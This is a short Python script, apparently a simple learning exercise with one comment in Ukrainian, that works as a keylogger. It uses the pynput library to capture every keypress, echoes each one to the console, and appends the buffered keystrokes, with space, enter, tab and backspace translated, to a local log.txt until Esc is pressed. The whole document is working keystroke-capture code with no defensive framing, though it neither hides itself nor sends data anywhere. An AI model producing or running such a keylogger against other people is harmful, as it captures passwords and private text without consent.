from pynput.keyboard import Key, Listener

keys_buffer = []
BUFFER_SIZE = 10


def on_press(key):
    global keys_buffer

    keys_buffer.append(key)
    print(f"{key} pressed")

    if len(keys_buffer) >= BUFFER_SIZE:
        write_file(keys_buffer)
        keys_buffer = []


def write_file(keys):
    with open("log.txt", "a", encoding="utf-8") as f:
        for key in keys:
            k = str(key).replace("'", "")

            if k == "Key.space":
                f.write(" ")
            elif k == "Key.enter":
                f.write("\n")
            elif k == "Key.tab":
                f.write("\t")
            elif k == "Key.backspace":
                f.write("[BACKSPACE]")
            elif not k.startswith("Key."):
                f.write(k)


def on_release(key):
    if key == Key.esc:
        # дописуємо залишок перед виходом
        if keys_buffer:
            write_file(keys_buffer)
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()